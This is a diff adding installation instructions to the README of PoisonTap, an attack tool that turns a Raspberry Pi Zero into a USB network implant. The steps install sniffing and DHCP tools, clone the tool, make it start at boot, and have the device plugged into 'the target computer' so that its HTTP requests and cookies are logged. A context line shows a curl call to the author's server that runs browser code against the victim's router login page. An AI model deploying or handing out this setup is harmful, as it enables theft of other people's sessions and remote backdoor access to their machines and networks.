@@ -200,6 +200,31 @@ curl 'http://samy.pl:1337/exec?$.get("http://192.168.0.1.ip.samy.pl/login",funct
 
 -----
 
+# Installation
+
+# Part 1
+
+**1.** Flash Raspbian Jessie full or Raspbian Jessie Lite [onto the SD card](https://www.raspberrypi.org/downloads/raspbian/).    
+**2.** Once Raspbian is flashed, open up the boot partition (in Windows Explorer, Finder etc) and add to the bottom of the ```config.txt``` file ```dtoverlay=dwc2``` on a new line, then save the file.    
+**3.** Finally, open up the ```cmdline.txt```. Be careful with this file, it is very picky with its formatting! Each parameter is seperated by a single space (it does not use newlines). Insert ```modules-load=dwc2,g_ether``` after ```rootwait```. To compare, an edited version of the ```cmdline.txt``` file at the time of writing, can be found [here](http://pastebin.com/WygSaptQ).    
+**4.** That's it, eject the SD card from your computer, put it in your Raspberry Pi Zero and connect it via USB to your computer. It will take up to 90s to boot up (shorter on subsequent boots). It should then appear as a USB Ethernet device. You can SSH into it using ```raspberrypi.local``` as the address.  
+
+(source: https://gist.github.com/gbaman/975e2db164b3ca2b51ae11e45e8fd40a)
+
+# Part 2
+
+**1.** Log with ssh to your RaspberryPi with `ssh pi@[RASPBERRY_IP]` (default password is `raspberry`)    
+**2.** Install some needed tools by running `sudo apt-get install dsniff isc-dhcp-server nodejs screen` (NodeJS may be already installed)    
+**3.** Then we need to setup our workspace. Move to pi's home directory `cd /home/pi/` then download PoisonTap `git clone https://github.com/samyk/poisontap.git`    
+**4.** Setup startup script: `sudo cp /home/pi/poisontap/pi_startup.sh /etc/init.d/ && sudo chmod +x /etc/init.d/pi_startup.sh`. Also we need to run pi_startup.sh at boot time: `sudo nano /etc/rc.local` and add `/etc/init.d/pi_startup.sh &` JUST BEFORE `exit 0`.    
+**5.** Setup DHCP configuration: PoisonTap provide the configuration file, just type `sudo cp /home/pi/poistontap/dhcpd.conf /etc/dhcp/dhcpd.conf`.     
+Next we need to setup the usb0 interface `echo -e "\nauto usb0\nallow-hotplug usb0\niface usb0 inet static\n\taddress 1.0.0.1\n\tnetmask 0.0.0.0" >> /etc/network/interfaces`. (If you have a permission denied error even with sudo just run `su` type root's password, if you don't know the password run `passwd root` and choose a secure password). When you're logged as root run the command again. Don't forget to exit root session when you are done.     
+
+# Part 3
+
+You can unplug all cables of your RPi and then plug it to the target computer. (Dumb notice: Use `OTG raspberry's port` and not the `PWR` one)
+Wait a few second and try load `http://nfl.com` in a browser. All HTTP requests will be logged in RPi under `/home/pi/poisontap/poisontap.cookies.log`
+
 # Contact
 
 **Point of Contact:** <a href="https://twitter.com/samykamkar" target=_blank>@SamyKamkar</a>
